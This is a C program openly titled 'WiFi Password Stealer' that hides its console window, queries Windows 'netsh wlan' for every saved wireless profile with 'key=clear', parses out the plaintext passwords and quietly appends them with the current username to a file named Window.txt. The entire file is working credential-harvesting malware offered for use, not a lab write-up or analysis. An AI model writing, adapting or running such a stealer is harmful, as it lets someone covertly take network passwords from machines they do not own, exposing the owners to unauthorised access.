// tcc -luser32
/*
	Name       : WiFi Password Stealer
	Creator    : Shail
	Start Date : 11 March, 2021
	End Date   : 13 March, 2021
	End Date   : 23 January, 2022
	Programming: C
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>

FILE *cmd;

size_t get_profiles();
void save_profile(char *line, size_t n);
void get_passwds(size_t num_profiles);
void exec_passwd_comd(char *comd, size_t n);
void save_passwd(char *line, size_t n);
void write_data();
void beep();


typedef struct cridential {
	char *profile;
	char *passwd;
} crident;
crident *cridentials = NULL;

int main() {
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	size_t num_profiles = get_profiles();
	if(num_profiles)
		get_passwds(num_profiles);
	write_data(num_profiles);
	beep();
	return 0;
}


void beep() {
	printf("\a");
	Sleep(2000);
}


size_t get_profiles() {
	size_t temp_line_len = 10;
	size_t line_len = 20;
	size_t n = 0; // Number of profiles
	size_t len;
	bool comp_line = false; // if line is complete or not
	char *temp_line = (char*) calloc(temp_line_len, 1);
	char *line = (char*) calloc(line_len, 1);

	cmd = popen("netsh wlan show profiles", "r");
	while(fgets(temp_line, temp_line_len, cmd)) {
		len = strlen(line) + strlen(temp_line);
		if (len > line_len) {
			line_len = len;
			line = realloc(line, line_len+1);
		}
		strcat(line, temp_line);
		if (line[strlen(line)-1] == '\n') {
			comp_line = true;
		}
		if(!(strcmp("There is no wireless interface on the system.\n", line))) {
			pclose(cmd);
			return 0;
		}
		if (comp_line) {
			if(comp_line && strstr(line, "All User Profile     :")) {
				n++;
				save_profile(line, n);
			}
			memset(line, 0, line_len);
			comp_line = false;
		}
	}
	pclose(cmd);
	free(temp_line);
	free(line);
	return n;
}


void save_profile(char *line, size_t n) {
	size_t len;
	char *pch = strchr(line, ':')+2;
	len = strlen(pch);
	pch[len-1] = 0;
	char *profile = (char *) malloc(len);
	strcpy(profile, pch);
	cridentials = (crident *) realloc(cridentials, n * sizeof(crident));
	cridentials[n-1].profile = profile;
}


#define comd_len 36 // Since command for retrieving password is 36 charachter long
void get_passwds(size_t num_profiles) {
	size_t n, len = 0;
	char *comd = (char *) calloc(1, 1);
	char *profile;

	for(n=0;n<num_profiles;n++) {
		profile = cridentials[n].profile;
		len = strlen(profile)+1; // +1 for NULL CHARACHTER
		comd = realloc(comd, len + comd_len); // comd_len + len which has lenght of profiles as well as NULL CAHRACHTER
		sprintf(comd, "netsh wlan show profile \"%s\" key=clear", profile);
		exec_passwd_comd(comd, n);
	}
	free(comd);
}

void exec_passwd_comd(char *comd, size_t n) {
	size_t temp_line_len = 100;
	size_t line_len = 1;
	bool added = false;
	char *temp_line = (char*) calloc(temp_line_len, 1);
	char *line = (char*) calloc(line_len, 1);

	cmd = popen(comd, "r");
	while(fgets(temp_line, temp_line_len, cmd)) {
		line_len = strlen(line) + strlen(temp_line);
		line = realloc(line, line_len+1);
		strcat(line, temp_line);
		if (line[strlen(line)-1] == '\n') {
			if (strstr(line, "Key Content            :")) {
				save_passwd(line , n);
				added = true;
				break;
			}
			memset(line, 0, line_len);
		}
	}
	if (!added) {
		strcpy(line, ": [NONE] ");
		save_passwd(line, n);
	}
	pclose(cmd);
	free(temp_line);
	free(line);
}

void save_passwd(char *line, size_t n) {
	char *pch = strchr(line, ':')+2;
	size_t len = strlen(pch);
	pch[len-1] = 0; // Replacing \n with \0
	char *passwd = malloc(len);
	strcpy(passwd, pch);
	cridentials[n].passwd = passwd;
}

void write_data(int num_profiles) {
	FILE * fp;
	char Uname[15];
	char dots[] = "---------------------------------------\n";

	fp = fopen("Window.txt", "a");  // Opening File to Append data in it
	fprintf(fp, "%sCREATED BY SHAIL\n%sUSERNAME :: ", dots, dots);

	// Saving USERNAME of Current User to Uname variable
	cmd = popen("echo %USERNAME%", "r");
	fgets(Uname, sizeof(Uname)-1, cmd);
	pclose(cmd);
	fputs(Uname, fp); // Saving username in file

	if(!num_profiles)
		fputs("There is no wireless interface on the system\n", fp);
	else {
		for(size_t i=0;i<num_profiles;i++)
			fprintf(fp, "%-24s : %s\n", cridentials[i].profile, cridentials[i].passwd);
	}

	fputs(dots, fp);
	fclose(fp);
}
